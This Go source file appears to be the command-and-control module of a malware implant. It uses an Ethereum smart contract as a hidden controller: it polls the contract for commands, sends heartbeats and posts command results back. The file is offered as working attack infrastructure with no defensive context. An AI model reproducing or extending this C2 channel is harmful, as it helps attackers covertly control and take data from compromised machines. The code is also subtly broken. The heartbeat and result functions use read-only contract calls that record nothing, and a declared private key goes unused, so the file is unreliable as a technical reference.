package connection

import (
	"github.com/ethereum/go-ethereum"
	"github.com/ethereum/go-ethereum/accounts/abi"
	"github.com/ethereum/go-ethereum/common"
	"github.com/ethereum/go-ethereum/ethclient"
	"strings"
)

var (
	PrivateKeyHex   string
	ContractAddress string
	ContractABI     string
	ChainRPC        string
)

func ConnectToChain() (*ethclient.Client, error) {
	client, err := ethclient.Dial(ChainRPC)
	if err != nil {
		return nil, err
	}
	return client, nil
}

func GetCommand(client *ethclient.Client) (string, error) {
	contractAddr := common.HexToAddress(ContractAddress)
	parsedABI, err := abi.JSON(strings.NewReader(ContractABI))
	if err != nil {
		return "", err
	}
	data, err := parsedABI.Pack("getCommand")
	if err != nil {
		return "", err
	}
	msg := ethereum.CallMsg{
		To:   &contractAddr,
		Data: data,
	}
	result, err := client.CallContract(nil, msg, nil)
	if err != nil {
		return "", err
	}
	var opt string
	err = parsedABI.UnpackIntoInterface(&opt, "getCommand", result)
	if err != nil {
		return "", err
	}
	return opt, nil
}

func Beat(client *ethclient.Client) error {
	contractAddr := common.HexToAddress(ContractAddress)
	parsedABI, err := abi.JSON(strings.NewReader(ContractABI))
	if err != nil {
		return err
	}
	data, err := parsedABI.Pack("beat")
	if err != nil {
		return err
	}
	msg := ethereum.CallMsg{
		To:   &contractAddr,
		Data: data,
	}
	_, err = client.CallContract(nil, msg, nil)
	if err != nil {
		return err
	}
	return nil
}

func SendResult(client *ethclient.Client, res []byte) error {
	contractAddr := common.HexToAddress(ContractAddress)
	parsedABI, err := abi.JSON(strings.NewReader(ContractABI))
	if err != nil {
		return err
	}
	data, err := parsedABI.Pack("sendCommandResult", res)
	if err != nil {
		return err
	}
	msg := ethereum.CallMsg{
		To:   &contractAddr,
		Data: data,
	}
	_, err = client.CallContract(nil, msg, nil)
	if err != nil {
		return err
	}
	return nil
}
